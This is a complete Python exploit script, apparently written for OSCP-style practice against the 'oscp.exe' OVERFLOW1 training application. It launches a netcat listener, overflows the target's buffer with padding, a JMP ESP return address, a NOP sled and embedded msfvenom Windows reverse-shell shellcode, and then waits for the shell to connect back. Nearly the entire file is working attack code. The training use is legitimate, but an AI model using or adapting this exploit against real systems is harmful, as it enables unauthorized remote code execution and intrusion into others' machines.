#!/usr/bin/python3
# Application exploit for oscp.exe app OVERFLOW1 app for simple buffer 
# overflow practice.
#
# Written by Rob Flemen
# Author Github: https://github.com/rflemen
# Author YouTube: https://www.youtube.com/@RobFlemen 
# 12/29/2025
import socket
import time
import argparse
import subprocess # needed for Popen

# Setup arguments and parser
parser = argparse.ArgumentParser(description="Exploits w/ buffer overflow, generates reverse shell.")
parser.add_argument("--ip", required=True, help="Target IP")
parser.add_argument("--port", required=True, type=int, help="Target port")
parser.add_argument("--lport", default=4444, type=int, help="Local port for reverse shell listener") # If you change here you must change shellcode!
args = parser.parse_args()


### PRINT BANNER ###        
print("eXPLoiT By:                ")
print("        ,------.           ")            
print(",--,--, |  .--. ',--,--,--.") 
print("|      ;|  '--' ||        |") 
print("|  ||  ||  | --' |  |  |  |") 
print("`--''--'`--'     `--`--`--'")                            
print("oscp.exe #1 Buffer Overflow Exploit")
time.sleep(2)


### SETUP LISTENER ###
print(f"[\033[92m\N{CHECK MARK}\033[00m] Starting nc listener on port {args.lport}...")
listener = subprocess.Popen(["nc", "-lvnp", str(args.lport)])

# Give listener time to bind
time.sleep(2)


### EXPLOIT CODE)
# Make connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((args.ip, args.port))

# Buffer components
prefix = b"OVERFLOW1 "
offset = 1978
jmp_esp = b"\xAF\x11\x50\x62"
nops = b"\x90" * 16

# msfvenom -p windows/shell_reverse_tcp LHOST=10.100.2.5 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py

buf =  b""
buf += b"\xdd\xc1\xd9\x74\x24\xf4\x5e\x31\xc9\xbd\xae\x24"
buf += b"\xcb\xac\xb1\x52\x31\x6e\x17\x83\xee\xfc\x03\xc0"
buf += b"\x37\x29\x59\xe0\xd0\x2f\xa2\x18\x21\x50\x2a\xfd"
buf += b"\x10\x50\x48\x76\x02\x60\x1a\xda\xaf\x0b\x4e\xce"
buf += b"\x24\x79\x47\xe1\x8d\x34\xb1\xcc\x0e\x64\x81\x4f"
buf += b"\x8d\x77\xd6\xaf\xac\xb7\x2b\xae\xe9\xaa\xc6\xe2"
buf += b"\xa2\xa1\x75\x12\xc6\xfc\x45\x99\x94\x11\xce\x7e"
buf += b"\x6c\x13\xff\xd1\xe6\x4a\xdf\xd0\x2b\xe7\x56\xca"
buf += b"\x28\xc2\x21\x61\x9a\xb8\xb3\xa3\xd2\x41\x1f\x8a"
buf += b"\xda\xb3\x61\xcb\xdd\x2b\x14\x25\x1e\xd1\x2f\xf2"
buf += b"\x5c\x0d\xa5\xe0\xc7\xc6\x1d\xcc\xf6\x0b\xfb\x87"
buf += b"\xf5\xe0\x8f\xcf\x19\xf6\x5c\x64\x25\x73\x63\xaa"
buf += b"\xaf\xc7\x40\x6e\xeb\x9c\xe9\x37\x51\x72\x15\x27"
buf += b"\x3a\x2b\xb3\x2c\xd7\x38\xce\x6f\xb0\x8d\xe3\x8f"
buf += b"\x40\x9a\x74\xfc\x72\x05\x2f\x6a\x3f\xce\xe9\x6d"
buf += b"\x40\xe5\x4e\xe1\xbf\x06\xaf\x28\x04\x52\xff\x42"
buf += b"\xad\xdb\x94\x92\x52\x0e\x3a\xc2\xfc\xe1\xfb\xb2"
buf += b"\xbc\x51\x94\xd8\x32\x8d\x84\xe3\x98\xa6\x2f\x1e"
buf += b"\x4b\xc3\xcb\x22\x8e\xbb\x11\x22\x81\x67\x9f\xc4"
buf += b"\xcb\x87\xc9\x5f\x64\x31\x50\x2b\x15\xbe\x4e\x56"
buf += b"\x15\x34\x7d\xa7\xd8\xbd\x08\xbb\x8d\x4d\x47\xe1"
buf += b"\x18\x51\x7d\x8d\xc7\xc0\x1a\x4d\x81\xf8\xb4\x1a"
buf += b"\xc6\xcf\xcc\xce\xfa\x76\x67\xec\x06\xee\x40\xb4"
buf += b"\xdc\xd3\x4f\x35\x90\x68\x74\x25\x6c\x70\x30\x11"
buf += b"\x20\x27\xee\xcf\x86\x91\x40\xb9\x50\x4d\x0b\x2d"
buf += b"\x24\xbd\x8c\x2b\x29\xe8\x7a\xd3\x98\x45\x3b\xec"
buf += b"\x15\x02\xcb\x95\x4b\xb2\x34\x4c\xc8\xd2\xd6\x44"
buf += b"\x25\x7b\x4f\x0d\x84\xe6\x70\xf8\xcb\x1e\xf3\x08"
buf += b"\xb4\xe4\xeb\x79\xb1\xa1\xab\x92\xcb\xba\x59\x94"
buf += b"\x78\xba\x4b"
shellcode = buf

# Assemble buffer
buffer = prefix + (b"A" * offset) + jmp_esp + nops + shellcode
buffer += b"\r\n"


### TIME TO HACK! ###
print("[\033[92m\N{CHECK MARK}\033[00m] Sending payload of", len(buffer), "bytes...")
time.sleep(2)
s.send(buffer)
print("[\033[92m\N{CHECK MARK}\033[00m] Payload sent...")
s.close()
time.sleep(2)

# Wait for the connection back!
listener.wait()
